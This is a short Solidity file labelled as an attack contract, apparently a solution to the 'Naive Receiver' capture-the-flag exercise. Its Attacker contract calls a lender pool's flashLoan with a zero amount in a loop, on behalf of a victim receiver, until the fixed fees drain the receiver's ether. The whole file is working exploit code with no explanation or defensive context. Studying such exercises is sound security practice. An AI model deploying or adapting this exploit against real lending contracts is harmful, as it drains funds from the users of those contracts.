pragma solidity ^0.8.0;

//attack contract

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;

    function fixedFee()  external pure returns (uint256);
}

contract Attacker {
    function attack(
        INaiveReceiverLenderPool pool,
        address payable receiver
    ) external {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}